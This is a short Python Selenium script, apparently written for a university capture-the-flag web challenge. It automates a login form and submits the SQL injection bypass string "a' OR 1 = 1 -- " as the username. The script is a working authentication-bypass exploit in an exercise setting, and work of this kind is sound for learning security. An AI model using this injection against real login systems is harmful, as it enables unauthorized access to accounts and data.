import requests
import json
import getpass
import warnings
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

chrome_options = Options() 
chrome_options.add_argument('--headless')  
chrome_options.add_argument('--disable-gpu')
chrome_path = "/home/heisenberg/NTUctf/Web/chromedriver"

def login(driver, username, password):
	driver.find_element_by_xpath("/html/body/div/div/div/form/label[1]/input").clear()
	driver.find_element_by_xpath("/html/body/div/div/div/form/label[2]/input").clear()
	time.sleep(1)
	driver.find_element_by_xpath("/html/body/div/div/div/form/label[1]/input").send_keys(username)
	driver.find_element_by_xpath("/html/body/div/div/div/form/label[2]/input").send_keys(password)
	driver.find_element_by_xpath("/html/body/div/div/div/form/button").click()
	time.sleep(1)
	msg = driver.find_element_by_xpath('/html/body/div[2]/p[2]')

	return msg.text

if __name__ == '__main__':
	warnings.filterwarnings('ignore')

	# Login
	root_url = "http://edu-ctf.zoolab.org:10210/"

	driver = webdriver.Chrome(executable_path=chrome_path,chrome_options=chrome_options)
	driver.get(root_url)

	username = 'username'
	password = 'password'
	msg = login(driver, username, password)
	print(msg)

	username = "a' OR 1 = 1 -- "
	password = 'password'
	msg = login(driver, username, password)
	print(msg)



